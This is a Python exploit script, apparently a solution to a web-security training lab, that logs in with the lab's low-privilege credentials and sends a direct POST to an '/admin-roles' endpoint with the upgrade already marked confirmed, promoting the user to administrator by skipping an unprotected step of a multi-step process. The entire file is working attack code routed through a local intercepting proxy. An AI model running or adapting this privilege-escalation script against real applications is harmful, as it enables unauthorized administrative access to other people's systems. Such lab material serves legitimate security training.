import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def promote_weiner_to_admin(s, url):
    
    # step - 1 login as wiener by his given creds
    login_url = url + '/login'
    login_data = { 'username' : 'wiener', 'password' : 'peter' }
    r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
    res = r.text
    if "Log out" in res:
        print('(+) Login sucessful!')

        # lets promote wiener to admin level

        # Step 2 of multi step process
        privilege_url = url + '/admin-roles'
        privilege_data_step_1 = { 'action' : 'upgrade', 'confirmed' : True, 'username' : 'wiener' }
        r = s.post(privilege_url, data=privilege_data_step_1, verify=False, proxies=PROXIES)
        res = r.text
        if "wiener (ADMIN)" in res:
            print('(+) Wiener is ADMIN now')
            sys.exit(-1)
        else:
            print('(+) Privilege exploit for wiener failed.')  
    else:
        print('(+) Login failed.')

def main():
    if len(sys.argv) != 2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    print('[*] Starting the Exploit : Broken Access Control - Multi-step process with no access control on one step ')
    promote_weiner_to_admin(s, url)

if __name__ == "__main__":
    main()